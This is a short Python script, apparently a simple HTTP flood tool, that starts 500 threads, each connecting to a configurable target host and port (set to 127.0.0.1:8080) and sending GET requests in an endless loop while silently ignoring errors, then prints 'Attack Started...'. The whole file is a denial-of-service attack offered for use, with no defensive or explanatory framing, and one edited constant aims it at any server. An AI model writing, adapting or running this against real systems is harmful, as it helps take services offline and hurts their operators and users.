import socket
import threading


TARGET = "127.0.0.1"
PORT = 8080


def attack():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET, PORT))
        while True:
            s.send(b"GET / HTTP/1.1\r\nHost: TARGET\r\n\r\n")
    except:
        pass

for _ in range(500):
    thread = threading.Thread(target=attack)
    thread.start()

print("Attack Started...")
